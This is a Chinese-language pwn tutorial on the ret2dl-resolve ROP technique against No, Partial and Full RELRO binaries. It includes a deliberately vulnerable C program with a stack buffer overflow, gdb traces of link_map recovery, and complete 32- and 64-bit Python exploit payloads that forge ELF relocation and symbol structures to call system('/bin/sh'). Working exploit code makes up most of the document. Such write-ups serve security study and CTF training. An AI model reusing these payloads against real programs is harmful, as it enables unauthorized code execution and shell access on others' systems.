一种根据 Dynamic Resolver 的工作原理来实现的 ROP 技术。通过构造传给 `_dl_runtime_resolve` 的参数，让 `_dl_fixup` 解析出我们要的 Symbol：

- 参数通过栈传递，x86 和 x64 都可以使用
- 可以直接 CALL PLT0，这样就只需要传 `reloc_arg`
- 需要控制 `link_map` 的时候可以 JMP PLT0 的第二条指令
- 不需要泄漏信息和 libc 版本，百分之百稳定 get shell

## What is RELRO

Relocation Read Only（RELRO）保护有不同等级，利用的方法和复杂程度不同：

- No RELRO：所有相关的数据部分都能写
- Partial RELRO（gcc 默认设定的值）：`.dynamic`、`.dynsym`、`.dynstr` 等部分只读
- Full RELRO：所有的 Symbol 在加载时都解析完成，GOT 只读，没有 `link_map` 和 Dynamic Resolver 的指针可以利用

下面根据三种情况分析不同的攻击方法。程序源码如下：

```cpp
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char buf[1000000];

int main() {
	char local[10];
//	write(1, "> ", 2); // 32位下可以在没有泄漏的情况下实现，64位下可能需要泄漏
	int len = read(0, buf, sizeof(buf));
	memcpy(local, buf, len);
	return 0;
}
```

## No RELRO

直接伪造 `.dynstr`，通过 `readelf` 找到 `.dynamic` 中 `DT_STRTAB` 的位置，把原本的 `.dynstr` 指向可控制的内存（在上面放 `"system\x00"`），然后跳到一个还没有解析过的 Symbol 上，如 `__gmon_start__`。这种方法只能在 No RELRO 的情况下使用。32 位下可以构造如下 payload：

```python
def memcpy(dst, src, length):
	return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)

st_name = 0x38
payload = (
	((
		'A' * 18 + # padding
		p32(buf + 1024 + 4) # set esp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		memcpy(dynstr_addr + 4, buf + 2048, 4) +
		p32(gmon_start_plt) +
		p32(0xdeadbeef) +
		p32(buf + 2048 + 12) # &"/bin/sh\x00"
	).ljust(2048, '\x00') +  # buf+2048
	p32(buf + 2048 + 4 - st_name) + # set strtab=&"system\x00"
	'system\x00\x00' +
	'/bin/sh\x00'
)
```

64 位下同理：

```python
def csu(func, rdi, rsi, rdx):
  payload = (
		p64(0x40066a) + p64(0) + p64(1) + p64(func) + p64(rdx) + p64(rsi) + p64(rdi) +
		p64(0x400650) + 56 * '\x00'
  )
  return payload

def memcpy(dst, src, length):
	return csu(memcpy_got, dst, src, length)

payload = (
	((
		'A' * 14 + # padding
		p64(buf + 1024 - 8) + # set rbp=buf+1024-8
		p64(leave_ret) # stack pivot ; set rsp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		memcpy(dynstr_addr + 8, buf + 2048, 8) +
		p64(pop_rdi_ret) +
		p64(buf + 2048 + 16) +
		p64(gmon_start_plt)
	).ljust(2048, '\x00') + # buf+2048
	p64(buf + 2048 + 8 - st_name) + # set strtab=&"system\x00"
	'system\x00\x00' +
	'/bin/sh\x00'
)
```

## Partial RELRO

构造一个假的 `Elf32_Rel`（`Elf64_Rela`），使 `r_offset` 在可写位置，`r_info` 使 `&.dynsym[r_info>>8]`（64 位下是 `&.dynsym[r_info>>32]`）可控。然后传一个特别大的 `reloc_arg` 进去，使 `.rel.plt+reloc_arg` 落在假的 `Elf32_Rel`（`Elf64_Rela`）上。接着构造一个假的 `Elf32_Sym`（`Elf64_Sym`），其中构造 `st_name` 使 `.dynstr+st_name` 可控（放上 `"system\x00"`）

如果可控的内存地址和 Section 相反或距离太远而无法使用（基本上 64 位会有这个问题），需要让 `reloc_arg`、`r_info`、`st_name` 的参数可以放进这块内存。其中 `.gnu.version[r_info>>8]` 要为 0，或者把 `l_info[VERSYMIDX (DT_VERSYM)]` 中的内容清空。由于我们构造的伪 Symbol 中的 `r_info` 过大，使得 `vernum[ELFW(R_SYM) (reloc->r_info)]` 读取出错，如果 `l->l_info[VERSYMIDX (DT_VERSYM)]` 的值为 NULL 就不会出错，如下：

```cpp
      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
        {
          const ElfW(Half) *vernum =
            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
          version = &l->l_versions[ndx];
          if (version->hash == 0)
            version = NULL;
        }
```

32 位下可以构造如下 payload：

```python
payload = (
	((
		'A' * 18 + # padding
		p32(buf + 1024 + 4) # set esp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		p32(plt0) +
		p32(buf + 2048 - relplt) + # set reloc_arg=buf+2048
		p32(0xdeadbeef) +
		p32(buf + 2048 + 36)
	).ljust(2048, '\x00') + # buf+2048
	# Elf32_Rel
	p32(buf) + # r_offset
	p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) << 8)) + # r_info
	p32(0) + # padding
	# Elf32_Sym <= buf+2048+12
	p32(buf + 2048 + 28 - dynstr) + # st_name
	p32(0) + # st_value
	p32(0) + # st_size
	p32(0x12) + # st_info
	# buf+2048+28
	'system\x00\x00' +
	'/bin/sh\x00'
)
```

64 位有一些地方不太一样，比如说结构体的大小等，其中 `reloc_arg` 的宏定义也和 32 位不同，上文也提到了。不过 `Elf64_Sym` 结构体的大小还是跟 32 位下的 `Elf32_Sym` 一样，只是几个变量的顺序有所改变，需要修改。同时，64 位下会产生上面提到的 Segmentation Fault。由于 64 位的 Function Call 用的是 `__libc_csu_init` 中的通用 Gadget，设置第一个参数 rdi 时只能传低 32 位，所以导致不能直接 `memcpy` 到 `link_map` 上来改 `l->l_info[VERSYMIDX (DT_VERSYM)]`，所以借助了 `read` 和 `write` 来实现：

```python
reloc_arg = (buf + 2048 + 16 - relplt) / 24
payload = (
	((
		'A' * 14 + # padding
		p64(buf + 1024 - 8) + # set rbp=buf+1024-8
		p64(leave_ret) # stack pivot ; set rsp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120
		write(1, 0, 0x1c8+8) + # buf+1024+240
		memcpy(buf + 1024 + 400, got1, 8) + # buf+1024+360
		read(0, 0, 0x1c8+8) + # buf+1024+480 ; l->l_info[VERSYMIDX (DT_VERSYM)]=NULL
		p64(pop_rdi_ret) +
		p64(buf + 2048 + 56) +
		p64(plt0) +
		p64(reloc_arg) # set reloc_arg
	).ljust(2048, '\x00') +  # buf+2048
	16 * '\x00' + # padding
	# Elf64_Rela
	p64(buf) + # r_offset
	p64(0x7 | (((buf + 2048 + 32 - dynsym) / 24) << 32)) + # r_info
	# Elf64_Sym <= buf+2048+32
	p32(buf + 2048 + 48 - dynstr) + # st_name
	p32(0x12) + # st_info
	p32(0) +
	p32(0) +
	# buf+2048+48
	'system\x00\x00' +
	'/bin/sh\x00'
)
```

Partial RELRO 的第二种方法是直接修改 `link_map`，将 `l_info[DT_STRTAB]` 指向构造出来的 `Elf32_Dyn`（`Elf64_Dyn`）来伪造 `.dynstr`。然后呼叫 `__gmon_start__` 并在对应 `st_name` 的地址处放上 `"system\x00"`。不过需要有特定的 Gadget 才有办法在不能泄漏的情况下使 `*(*(pointer)+offset)=value`。32 位下构造如下 payload：

```python
def memcpy(dst, src, length):
	return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)

payload = (
	((
		'A' * 18 + # padding
		p32(buf + 1024 + 4) # set esp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		memcpy(buf + 1024 + 32, got1, 4) + # buf+1024+20
		memcpy(buf, 0, 56) + # buf+1024+40
		memcpy(buf + 52, buf + 2048, 4) + # buf+1024+60
		memcpy(buf + 1024 + 88, got1, 4) + # buf+1024+80
		memcpy(0, buf, 56) + # buf+1024+100
		p32(gmon_start_plt) + p32(0xdeadbeef) + p32(buf + 2048 + 20)
	).ljust(2048, '\x00') + # buf+2048
	p32(buf + 2048 + 4) +
	p32(5) +
	p32(buf + 2048 + 12 - st_name) +
	# buf+2048+12
	'system\x00\x00' +
	'/bin/sh\x00'
)
```

64 位下对 `link_map` 的修改同样借助了泄漏来实现：

```python
payload = (
	((
		'A' * 14 + # padding
		p64(buf + 1024 - 8) + # set rbp=buf+1024-8
		p64(leave_ret) # stack pivot ; set rsp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120
		memcpy(buf, 0, 112) + # buf+1024+240
		memcpy(buf + 104, buf + 2048, 8) + # buf+1024+360
		write(1, buf, 112) + # buf+1024+480
		memcpy(buf + 1024 + 640, got1, 8) + # buf+1024+600
		read(0, 0, 112) + # buf+1024+720
		p64(pop_rdi_ret) +
		p64(buf + 2048 + 32) +
		p64(gmon_start_plt)
	).ljust(2048, '\x00') + # buf+2048
	p64(buf + 2048 + 8) +
	p64(5) +
	p64(buf + 2048 + 24 - st_name) +
	# data+24
	'system\x00\x00' +
	'/bin/sh\x00'
)
```

## Full RELRO

GOT1 和 GOT2 在 Full RELRO 时被置为了 0，所以重点在于如何找回 `link_map` 和 Dynamic Resolver：

- 找回 `link_map`：`.dynamic` 中 `DT_BUG` 指向 `r_debug` 结构，`r_debug` 中 `r_map` 指向 `link_map`；
- 找回 Dynamic Resolver：用 `l_next` 找下一个 Library，然后用 `l_info[DT_PLTGOT]` 找出 Library 的 `.got.plt` 地址（因为大部分 Library 都不是 Full RELRO，它们对应的 GOT2 就是 `_dl_runtime_resolve`）。

以 32 位的程序为例，下面是 `link_map` 和 `_dl_runtime_resolve` 的查找过程：

```gdb
(gdb) p/x *(Elf32_Dyn *)(0x08049ee8+12*8)
$1 = {
  d_tag = 0x15,
  d_un = {
    d_val = 0xf7ffd928,
    d_ptr = 0xf7ffd928
  }
}
(gdb) p/x *(struct r_debug *)0xf7ffd928
$2 = {
  r_version = 0x1,
  r_map = 0xf7ffd940,
  r_brk = 0xf7febae8,
  r_state = 0x0,
  r_ldbase = 0xf7fdd000
}
(gdb) p/x *(struct link_map *)0xf7ffd940
$3 = {
  l_addr = 0x0,
  l_name = 0xf7ffdc2c,
  l_ld = 0x8049ee8,
  l_next = 0xf7ffdc30,
  l_prev = 0x0,
  l_real = 0xf7ffd940,
  l_ns = 0x0,
  l_libname = 0xf7ffdc20,
  l_info = {0x0, 0x8049ee8, 0x8049f58, 0x8049f50, 0x0, 0x8049f28, 0x8049f30, 0x0, 0x0, 0x0, 0x8049f38, 0x8049f40, 0x8049ef0, 0x8049ef8, 0x0, 0x0, 0x0,
    0x8049f70, 0x8049f78, 0x8049f80, 0x8049f60, 0x8049f48, 0x0, 0x8049f68, 0x8049f90, 0x8049f00, 0x8049f10, 0x8049f08, 0x8049f18, 0x0, 0x0, 0x0, 0x0, 0x0,
    0x8049fa0, 0x8049f98, 0x0, 0x0, 0x8049f90, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fa8, 0x0 <repeats 25 times>, 0x8049f20},
  l_phdr = 0x8048034,
  l_entry = 0x8048350,
  l_phnum = 0x9,
  l_ldnum = 0x0,
  ...
(gdb) p/x ((struct link_map *)0xf7ffd940)->l_next->l_info[3]
$4 = 0x0
(gdb) p/x ((struct link_map *)0xf7ffd940)->l_next->l_next->l_info[3]
$5 = 0xf7fd2de0
(gdb) p/x *(Elf32_Dyn *)0xf7fd2de0
$6 = {
  d_tag = 0x3,
  d_un = {
    d_val = 0xf7fd3000,
    d_ptr = 0xf7fd3000
  }
}
(gdb) x/3wx 0xf7fd3000
0xf7fd3000:	0x0019bd88	0xf7fd7770	0xf7ff04e0
(gdb) x/i 0xf7ff04e0
   0xf7ff04e0 <_dl_runtime_resolve>:	push   eax
```

32 位下的构造如下：

```python
payload = (
	((
		'A' * 18 + # padding
		p32(buf + 1024 + 4) # set esp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		memcpy(buf + 1024 + 32, r_debug_addr, 4) + # buf+1024+20
		memcpy(buf, 0, 8) + # buf+1024+40 ; link_map=buf+4
		memcpy(buf + 1024 + 72, link_map_addr, 4) + # buf+1024+60
		memcpy(buf + 8, 0, 16) + # buf+1024+80 ; link_map->l_next=buf+20
		memcpy(buf + 1024 + 112, buf + 20, 4) + # buf+1024+100
		memcpy(buf + 8, 0, 16) + # buf+1024+120 ; link_map->l_next->l_next=buf+20
		memcpy(buf + 1024 + 152, buf + 20, 4) + # buf+1024+140
		memcpy(buf + 8, 0, 48) + # buf+1024+160 ; link_map->l_next->l_next->l_info[DT_PLTGOT]=buf+52
		memcpy(buf + 1024 + 192, buf + 52, 4) + # buf+1024+180
		memcpy(buf + 8, 0, 8) + # buf+1024+200 ; .got.plt=buf+12
		memcpy(buf + 1024 + 232, buf + 12, 4) + # buf+1024+220
		memcpy(buf + 8, 0, 12) + # buf+1024+240 ; _dl_runtime_resolve=buf+16
		memcpy(buf + 1024 + 280, dl_runtime_resolve_addr, 4) + # buf+1024+260
		memcpy(buf + 1024 + 284, link_map_addr, 4) + # buf+1024+280
		p32(0) + # _dl_runtime_resolve
		p32(0) + # link_map
		p32(reloc_arg) + # reloc_arg
		p32(0xdeadbeef) +
		p32(buf + 2048 + 36)
	).ljust(2048, '\x00') + # buf+2048
		# Elf32_Rel
		p32(buf) + # r_offset
		p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) << 8)) + # r_info
		p32(0) + # padding
		# Elf32_Sym <= buf+2048+12
		p32(buf + 2048 + 28 - dynstr) + # st_name
		p32(0) + # st_value
		p32(0) + # st_size
		p32(0x12) + # st_info
		# buf+2048+28
		'system\x00\x00' +
		'/bin/sh\x00'
)
```

64 位下会需要更长的输入才能完成一系列的构造：

```python
payload = (
	((
		'A' * 14 + # padding
		p64(buf + 1024 - 8) + # set rbp=buf+1024-8
		p64(leave_ret) # stack pivot ; set rsp=buf+1024
	).ljust(1024, '\x00') +
		memcpy(buf + 1024 + 160, r_debug_addr, 8) + # buf+1024+120
		memcpy(buf, 0, 16) + # buf+1024+240 ; link_map_addr=buf+8
		memcpy(buf + 1024 + 400, link_map_addr, 8) + # buf+1024+360
		memcpy(buf + 16, 0, 32) + # buf+1024+480 ; l->l_next=buf+40
		memcpy(buf + 1024 + 640, buf + 40, 8) + # buf+1024+600
		memcpy(buf + 16, 0, 32) + # buf+1024+720 ; l->l_next->l_next=buf+40
		memcpy(buf + 1024 + 880, buf + 40, 8) + # buf+1024+840
		memcpy(buf + 16, 0, 96) + # buf+1024+960 ; l->l_next->l_next->l_info[DT_PLTGOT]=buf+104
		memcpy(buf + 1024 + 1120, buf + 104, 8) + # buf+1024+1080
		memcpy(buf + 16, 0, 16) + # buf+1024+1200 ; .got.plt=buf+24
		memcpy(buf + 1024 + 1360, buf + 24, 8) + # buf+1024+1320
		memcpy(buf + 16, 0, 24) + # buf+1024+1440 ; _dl_runtime+resolve=buf+32
		memcpy(buf + 1024 + 1600, link_map_addr, 8) + # buf+1024+1560
		write(1, 0, 0x1c8+8) + # buf+1024+1680
		memcpy(buf + 1024 + 1840, link_map_addr, 8) + # buf+1024+1800
		read(0, 0, 0x1c8+8) + # buf+1024+1920
		memcpy(buf + 1024 + 2176, dl_runtime_resolve_addr, 8) + # buf+1024+2040
		memcpy(buf + 1024 + 2184, link_map_addr, 8) + # buf+1024+2160
		p64(pop_rdi_ret) +
		p64(buf + 4096 + 40) +
		p64(0) + # _dl_runtime_resolve
		p64(0) + # link_map
		p64(reloc_arg) # reloc_arg
	).ljust(4096, '\x00') + # buf+4096
		# Elf64_Rela
		p64(buf) + # r_offset
		p64(0x7 | (((buf + 4096 + 16 - dynsym) / 24) << 32)) + # r_info
		# Elf64_Sym <= buf+4096+16
		p32(buf + 4096 + 32 - dynstr) + # st_name
		p32(0x12) + # st_info
		p32(0) +
		p32(0) +
		# buf+4096+32
		'system\x00\x00' +
		'/bin/sh\x00'
)
```

# References

https://www.youtube.com/watch?v=wsIvqd9YqTI
https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf
https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=42933
http://www.inforsec.org/wp/?p=389
http://pwn4.fun/2016/11/09/Return-to-dl-resolve/
http://rk700.github.io/2015/08/09/return-to-dl-resolve/
http://phrack.org/issues/58/4.html
